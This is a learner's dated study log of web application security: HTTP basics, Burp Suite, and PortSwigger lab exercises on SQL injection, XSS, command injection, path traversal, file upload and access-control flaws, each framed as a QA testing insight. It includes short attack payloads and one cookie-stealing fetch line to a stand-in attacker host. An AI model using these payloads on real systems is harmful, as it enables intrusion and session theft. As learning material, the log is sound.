# Daily Progress Log

## Lesson 1: [29.11.2025]
**Focus:** Anatomy of a Request/Response

**Resources:** MDN Web Docs & MonsterLessons Academy
* [MDN HTTP Overview](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Overview)
* [HTTP Request and Response Format - You Must Know It](https://www.youtube.com/watch?v=NqKytCEaqMw)

**Learnings:**
* **Method:** I saw a `GET` request. This asks the server for data.
* **Status Code:** The server returned `200`, which means "OK".
* **Headers:** I noticed the `User-Agent` header, which tells the server I am using [Your Browser Name].
* **Insight:** I realized that "Cookies" are just lines of text sent in the Header. If I can change this text in Burp Suite later, I might be able to trick the server.

## Lesson 2: [29.11.2025]
**Focus:** Burp Suite Installation & Proxy Chaining

**Resource:** Elevate Cyber Video
* [How to use Burp Suite for Beginners](https://www.youtube.com/watch?v=GxvFqgCBW-8)

**Learnings:**
* **Proxying:** Configured FoxyProxy to route traffic to `127.0.0.1:8080`.
* **The Handshake:** Learned that Burp acts as a "Man-in-the-Middle". I had to install Burp's CA Certificate so my browser wouldn't reject the connection as "Insecure."
* **First Intercept:** Successfully paused a request to Google.
* **QA Insight:** This is different from the "Network Tab" because I can actually *modify* the data before the server sees it. The Network tab is read-only; Burp is read-write.

## Lesson 3: Burp Repeater [29.11.2025]
**Focus:** Modifying HTTP Requests in Flight

**Resource:** PortSwigger Documentation
* [Burp for Beginners: How to Use Repeater](https://www.youtube.com/watch?v=LfuU5u6C2Sk)

**Learnings:**
* **Repeater:** Learned that I can "replay" a request as many times as I want without using the browser.
* **The Experiment:** I searched for "cat", intercepted the request, changed the parameter `q=cat` to `q=dog` in Repeater, and the server responded with search results for dogs.
* **QA Insight:** In manual QA, if I want to test 50 different inputs, I have to type them into the UI 50 times. With Repeater, I can just change the text and hit "Send" 50 times in seconds. This is much faster for testing edge cases.

## Lesson 4: GET vs POST [30.11.2025]
**Focus:** Request Methods & Data Placement

**Resource:** HTTP Methods (MDN) / TestPHP Vulnweb
* [HTTP GET vs POST explained for beginners](https://www.youtube.com/watch?v=tkfVQK6UxDI)


**Learnings:**
* **GET:** I observed that GET requests put parameters in the URL (Query String).
* **POST:** I observed that POST requests hide parameters in the Body (bottom of the request).
* **The "Envelope":** I intercepted a login attempt on `testphp.vulnweb.com`. Even though the password was dots `••••` on the screen, Burp showed me clear text `pass=password123` in the body.
* **QA Insight:** I need to check my company's application. If any sensitive data (tokens, PII) appears in the URL bar, it's a security defect because URLs are logged in browser history.

## Lesson 5: Cookies & Sessions [30.11.2025]
**Focus:** Session Management & State

**Resource:** MDN HTTP Cookies
* [What is a cookie?](https://www.youtube.com/watch?v=I01XMRo2ESg)

**Learnings:**
* **Statelessness:** Learned that HTTP doesn't remember me. The "Cookie" is the only thing keeping me logged in.
* **The Experiment:** I logged into `testphp.vulnweb.com`, found the session cookie in the DevTools "Application" tab, and deleted it. Refreshing the page immediately logged me out.
* **QA Insight:** This explains why "Clear Cache & Cookies" fixes so many bugs—it forces a fresh handshake with the server.
* **Security Insight:** If a hacker can copy my cookie text and paste it into their browser, they *are* me. They don't need my password. This is why "Secure" and "HttpOnly" flags on cookies are critical (I'll learn those later).

## Lesson 6: First Logic Hack [30.11.2025]
**Focus:** Consolidating HTTP, Cookies, and Repeater

**Resource:** PortSwigger Lab: User role controlled by request parameter
* [Business Logic Vulnerabilities | Complete Guide](https://www.youtube.com/watch?v=HLS2-kGHupU)

**Learnings:**
* **The Vulnerability:** The application trusted the cookie sent by the user without verifying it on the server.
* **The Exploit:** I intercepted the request where the cookie said `admin=false`. I changed it to `true` in Repeater.
* **Result:** The server believed me and served the Admin Panel.
* **QA Insight:** This is a classic "Client-Side Trust" bug. As a QA, I should always ask: "Can I change this value in the API call?" If the backend accepts it without checking, it's a bug.

## Lesson 7: SQL Injection (Retrieval) [01.12.2025]
**Focus:** Breaking the WHERE clause

**Resource:** Computerphile / PortSwigger
* [What is SQL injection (SQLi)?](https://portswigger.net/web-security/sql-injection)
* [Running an SQL Injection Attack - Computerphile](https://www.youtube.com/watch?v=ciNHn38EyRc)

**Learnings:**
* **The Theory:** SQLi works by breaking out of the data context using a single quote `'` and appending new logic.
* **The Payload:** Used `' OR 1=1--`.
    * `'` closed the category string.
    * `OR 1=1` is always true, so the database returned *everything*.
    * `--` commented out the rest of the legitimate query so it wouldn't crash.
* **QA Insight:** I should test search bars with a single quote `'`. If the page crashes or returns a database error, it's likely vulnerable.

## Lesson 8: SQLi Login Bypass [06.12.2025]
**Focus:** Commenting out password checks

**Resource:** PortSwigger Lab
* [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic)
* [SQL Injection Login Bypass - PortSwigger Web Security Academy Series](https://www.youtube.com/watch?v=VO1dIxidYTo)

**Learnings:**
* **The Comment:** In SQL, `--` (dash dash space) means "comment."
* **The Hack:** I logged in as `administrator` by typing `administrator' --`.
* **Result:** The application ignored the password field entirely because I commented it out in the query.
* **QA Insight:** Every login form I test from now on gets a `' --` test.

## Lesson 9: Burp Intruder [06.12.2025]
**Focus:** Automation & Brute Force

**Resource:** YouTube Guides
* [Burp for Beginners: How to Use Intruder](https://youtu.be/mibKttwhbRk?si=KRLHAGhlg1pbeFu5)

**Learnings:**
* **Intruder:** Used for "Fuzzing" (sending many inputs to one place).
* **Sniper Attack:** The default mode. Replaces one placeholder with a list of words.
* **Analysis:** Learning to read the results is key. I look for anomalies in "Response Length" or "Status Code" to find the successful login.

## Lesson 10: SQLi UNION Attacks [11.12.2025]
**Focus:** Determining Column Count

**Resource:** Rana Khalil / PortSwigger
* [SQL Injection - Lab #3 SQLi UNION attack determining the number of columns returned by the query](https://youtu.be/umXGHbEyW5I?si=kmoWkKY76K60VAWb)
* [SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

**Learnings:**
* **The Rule:** UNION statements only work if the number of columns matches the original query.
* **The Technique:** I used `' ORDER BY X--` to guess the number of columns. When I incremented X until the page crashed (Internal Server Error), I knew the limit.
* **QA Insight:** If I see a search filter, I should try sorting by non-existent columns. If it throws a 500 error, I know the database is exposed.

## Lesson 11: Reflected XSS [11.12.2025]
**Focus:** JavaScript Injection

**Resource:** PwnFunction
* [Cross-Site Scripting (XSS) Explained](https://www.youtube.com/watch?v=EoaDgUgS6QA)
* [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)

**Learnings:**
* **Mechanism:** Input -> Server -> Reflected immediately back to Browser -> Browser executes it as code.
* **The Payload:** `<script>alert(1)</script>` is the "Hello World" of XSS.
* **Impact:** If I can run `alert(1)`, I can also run `fetch('attacker.com?cookie=' + document.cookie)` and steal their session.

## Lesson 12: Stored XSS [13.12.2025]
**Focus:** Persistent JavaScript Injection

**Resource:** PortSwigger
* [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
* [Stored, Blind, Reflected and DOM - Everything Cross--Site Scripting (XSS)](https://youtu.be/hQEQ-KJh06M?si=xuCQgOm4aGJWZ-AN)

**Learnings:**
* **Difference:** Reflected requires a link; Stored is a trap left on the page.
* **The Experiment:** I posted a comment with `<script>alert(1)</script>`. Now, anyone who reads the blog gets the popup.
* **QA Insight:** I need to test all "Save" fields (User Bio, Comments, Notes) for XSS. If I save a script and it executes when I view it later, it's Stored XSS.

## Lesson 15: Username Enumeration [13.12.2025]
**Focus:** Analyzing Error Messages

**Resource:** Rana Khalil
* [Vulnerabilities in password-based login](https://portswigger.net/web-security/authentication/password-based)
* [Authentication Vulnerabilities - Lab #1 Username enumeration via different responses | Long Version](https://www.youtube.com/watch?v=UGw7Ph-9dL8)

**Learnings:**
* **The Leak:** If an app tells me "User not found," it helps me. I can throw away that username and focus only on the valid ones.
* **The Fix:** Developers should always use generic messages ("Invalid credentials") and ensure the response time is the same (to prevent Timing Attacks).
* **QA Insight:** I will check my company's login page. If I type a random user and it says "User not found," I'm filing a bug.

## Lesson 16: Vertical Privilege Escalation [10.01.2026]
**Focus:** Finding Hidden Admin Panels

**Resource:** robots.txt & PortSwigger
* [Access control vulnerabilities and privilege escalation](https://portswigger.net/web-security/access-control#what-is-access-control)
* [Vertical privilege escalation](https://portswigger.net/web-security/access-control#vertical-privilege-escalation)
* [Broken Access Control | Complete Guide ](https://www.youtube.com/watch?v=_jz5qFWhLcg)

**Learnings:**
* **Security by Obscurity:** Hiding a link doesn't secure it. If I guess the URL (`/admin`), I shouldn't be able to use it.
* **The Check:** The server must check "Is this user an Admin?" *before* rendering the page.
* **QA Insight:** I will check `robots.txt` on my staging servers to see if devs are hiding admin routes there.

## Lesson 17: Horizontal Privilege Escalation (IDOR) [10.01.2026]
**Focus:** Accessing Other Users' Data

**Resource:** InsiderPhD
* [Finding Your First Bug: Manual IDOR Hunting](https://www.youtube.com/watch?v=gINAtzdccts)
* [Horizontal privilege escalation](https://portswigger.net/web-security/access-control#horizontal-privilege-escalation)

**Learnings:**
* **The Flaw:** The application trusted my input (`id=carlos`) without checking if I *am* Carlos.
* **QA Insight:** This is the #1 bug I can find as a Manual QA. Every time I see an ID in the URL, I should change it.

## Lesson 18: Password Reset Poisoning [10.01.2026]
**Focus:** Manipulating Host Headers

**Resource:** PortSwigger
* [HTTP Host header attacks](https://portswigger.net/web-security/host-header)
* [Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)

**Learnings:**
* **The Mechanism:** The code used `request.header('Host')` to generate the email link.
* **The Exploit:** I intercepted the "Forgot Password" request and changed the Host header to my Exploit Server. The victim received a link pointing to ME.
* **Impact:** Critical. Full account takeover.

## Lesson 19: OS Command Injection (Simple Case) [11.01.2026]
**Focus:** Appending system commands to application parameters.

**Resource:** PortSwigger Academy.
* [OS command injection](https://portswigger.net/web-security/os-command-injection)

**Learnings:**
* **Command Chaining:** Learned that characters like `|` (pipe) or `&` (ampersand) allow me to run multiple commands in a single string.
* **The Payload:** Injected `| whoami` into the `storeId` parameter.
* **The Result:** The server returned its own system username (e.g., `www-data`), proving I had executed code on the underlying operating system.
* **QA Insight:** I should look for features that interact with the server environment (e.g., generating PDFs, checking server status) and test them with command separators.

## Lesson 20: Blind OS Command Injection (Time-Based) [13.01.2026]
**Focus:** Detecting execution through latency.

**Resource:** PortSwigger Academy.
* [Blind OS command injection vulnerabilities](https://portswigger.net/web-security/os-command-injection#blind-os-command-injection-vulnerabilities)

**Learnings:**
* **Side-Channels:** Learned that even if a server doesn't "talk back" (no output), I can still confirm execution by making it "busy."
* **The Command:** Appended `|| sleep 10 ||` to a parameter.
* **The Result:** The HTTP response took 10 seconds to return, proving the server executed my code.
* **QA Insight:** Always monitor the "Response Time" in the Network tab. If certain inputs cause a massive delay, it might be more than just a performance bug.

## Lesson 21: Remote Code Execution via File Upload [14.01.2026]
**Focus:** Uploading and executing server-side scripts.

**Resource:** PortSwigger
* File upload vulnerabilities focus on [Exploiting unrestricted file uploads to deploy a web shell](https://portswigger.net/web-security/file-upload#exploiting-unrestricted-file-uploads-to-deploy-a-web-shell)

**Learnings:**
* **The Web Shell:** Learned that a file upload field is a direct gateway to the server's filesystem if not restricted.
* **Execution:** By uploading a `.php` file and then requesting it, the server pokes its own filesystem and returns the result to me.
* **QA Insight:** Testing "Positive" cases (can I upload a JPG?) isn't enough. I must test "Negative" cases by trying to upload scripts and observing if the server tries to execute them or returns them as plain text.

## Lesson 22: Directory (Path) Traversal [14.01.2026]
**Focus:** Stepping out of the web root to read system files.

**Resource:** PortSwigger
* [Path traversal](https://portswigger.net/web-security/file-path-traversal)

**Learnings:**
* **The Sequence:** `../` is a directive that moves the file pointer up one level in the directory tree.
* **The Target:** Accessed `/etc/passwd`, a classic proof-of-concept for traversal.
* **QA Insight:** Any parameter that references a filename is a security risk. I should test if I can access files outside the intended directory.

## Lesson 23: File Upload Race Conditions [15.01.2026]
**Focus:** Exploiting the timing gap between upload and validation.

**Resource:** PortSwigger Academy.
* [Exploiting file upload race conditions](https://portswigger.net/web-security/file-upload#exploiting-file-upload-race-conditions)

**Learnings:**
* **Timing:** Security is often a process. If I can interact with the server mid-process, I can bypass "delete-after-check" logic.
* **The Tools:** Used Burp Intruder to "flood" the server with requests to catch the file before it vanished.
* **QA Insight:** "Speed" and "Concurrency" are security factors. Testing how an app handles multiple simultaneous requests can reveal these deep logic flaws.

## Lesson Summary: Server Takeover (RCE & Traversal) [15.01.2026]
**Focus:** Remote Code Execution (RCE) and File System Access.

**Learnings:**
* **Command Injection:** Learned to chain OS commands using `|`, `;`, and `&`.
* **Blind Injection:** Used time-based delays (`sleep`) to confirm execution when output is hidden.
* **File Uploads:** Uploaded PHP web shells to gain a persistent "foot in the door."
* **Path Traversal:** Navigated the directory tree using `../` to read sensitive files like `/etc/passwd`.
* **Bypass Logic:** Explored how filters can be tricked by nesting sequences or using race conditions.

## Lesson 24: Burp Intruder Attack Types [15.01.2026]
**Focus:** Understanding automation logic and permutations.

**Resource:** Burp Suite Documentation / Hands-on logic.

**Learnings:**
* **Attack Types:** Distinguished between Sniper (one target), Pitchfork (paired lists), and Cluster Bomb (all combinations).
* **Efficiency:** Learned that Cluster Bomb is the most thorough but also the "noisiest" and slowest due to the high volume of requests ($List A \times List B$).
* **QA Insight:** Automated brute forcing isn't just about speed; it's about choosing the right "Attack Type" to match the logic of the vulnerability I'm testing.

## Lesson 25: Payload Processing Rules [15.01.2026]
**Focus:** Transforming data on-the-fly for complex attacks.

**Resource:** Burp Suite Professional / Community Features.

**Learnings:**
* **Scalability:** Learned that processing rules allow me to use a single "clean" wordlist for many different types of attacks.
* **Chaining:** Discovered that I can stack rules (e.g., Prefix -> Hash -> Encode) to match the specific requirements of a modern web API.
* **QA Insight:** Many bugs are hidden behind encoding. If I only test "plain text," I might miss vulnerabilities that only trigger when the data is formatted a certain way (like JSON or Base64).

## Lesson 26: Advanced Filtering & Logging [20.01.2026]
**Focus:** Managing high-volume traffic data.

**Resource:** Burp Suite Proxy Filter & Logger.
* [Filtering the HTTP history](https://portswigger.net/burp/documentation/desktop/tools/proxy/http-history/filter-settings)

**Learnings:**
* **The Filter Bar:** Learned to use "Search Term" and "Status Code" filters to find needles in haystacks.
* **Logger vs. History:** Logger is the "Black Box" flight recorder of Burp—it sees everything, even automated tool traffic that doesn't hit the Proxy history.
* **Scope Discipline:** Realized that "Show only in-scope items" is the first step to any successful test to avoid getting distracted by 3rd party traffic.
* **QA Insight:** In a big enterprise app, I might generate 20,000 requests in a day. Mastery of filters is the only way to prove a bug happened at a specific timestamp.

* **Search Context:** Confirmed that Burp searches both Request and Response by default.
* **Refinement:** Learned to use Regex and Case Sensitivity to reduce false positives in high-traffic logs.
* **Pro-Tip:** Using "Negative search" helps clear the clutter when a specific error message is flooding the history. 🧹

## Lesson 27: Broken Object Level Authorization (BOLA) a.k.a. IDOR [20.01.2026]
**Focus:** Manipulating resource IDs to access unauthorized data.

**Resource:** OWASP API Security Top 10.
* [API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
* [Insecure direct object references (IDOR)](https://portswigger.net/web-security/access-control/idor)

**Learnings:**
* **Predictable IDs:** Learned that sequential IDs (1, 2, 3...) are high-risk targets.
* **The Vulnerability:** The server authenticated me, but failed to authorize my access to a specific object.
* **QA Insight:** Whenever I see an ID in a URL or a POST body, I must test if I can change it to view or modify data I don't own.

## Day 28: Mass Assignment (API Property Level Authorization) [20.01.2026]
**Focus:** Injecting hidden properties into API requests.

**Resource:** OWASP API Security.
* [OWASP API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
* [Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)

**Learnings:**
* **Unfiltered Input:** APIs that automatically map JSON input to database models are dangerous.
* **The "Guessing" Game:** Attackers can guess hidden fields (like "isAdmin") even if the UI doesn't show them.
* **QA Insight:** I should always check the API documentation (or Swagger files) to see all possible fields, then try to "over-post" them in my requests.



